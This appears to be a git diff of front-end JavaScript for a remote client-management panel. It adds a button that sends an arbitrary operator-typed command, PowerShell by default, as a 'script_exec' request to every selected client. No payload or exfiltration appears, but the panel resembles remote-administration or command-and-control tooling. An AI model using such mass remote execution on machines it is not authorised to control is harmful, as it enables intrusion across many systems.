@@ -586,6 +586,46 @@ bulkUninstallBtn?.addEventListener("click", async () => {
   setTimeout(() => loadWithOptions({ force: true }), 1000);
 });
 
+const massCmdInput = document.getElementById("mass-cmd-input");
+const massCmdType = document.getElementById("mass-cmd-type");
+const massCmdRun = document.getElementById("mass-cmd-run");
+
+massCmdRun?.addEventListener("click", async () => {
+  const cmd = massCmdInput?.value.trim();
+  if (!cmd) {
+    alert("Enter a command to execute.");
+    return;
+  }
+  const scriptType = massCmdType?.value || "powershell";
+  const count = selectedClients.size;
+  if (count === 0) return;
+  if (!confirm(`Execute on ${count} client(s)?\n\n[${scriptType}] ${cmd}`)) return;
+
+  massCmdRun.disabled = true;
+  massCmdRun.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Running...';
+  let success = 0;
+  for (const clientId of selectedClients) {
+    try {
+      const res = await fetch(`/api/clients/${clientId}/command`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ action: "script_exec", script: cmd, scriptType }),
+      });
+      if (res.ok) success++;
+    } catch {}
+  }
+  massCmdRun.disabled = false;
+  massCmdRun.innerHTML = '<i class="fa-solid fa-terminal"></i> Execute';
+  alert(`Command sent to ${success}/${count} clients`);
+});
+
+massCmdInput?.addEventListener("keydown", (e) => {
+  if (e.key === "Enter") {
+    e.preventDefault();
+    massCmdRun?.click();
+  }
+});
+
 window.toggleClientSelection = toggleClientSelection;
 window.isClientSelected = (clientId) => selectedClients.has(clientId);
 window.syncClientSelection = syncSelectionState;
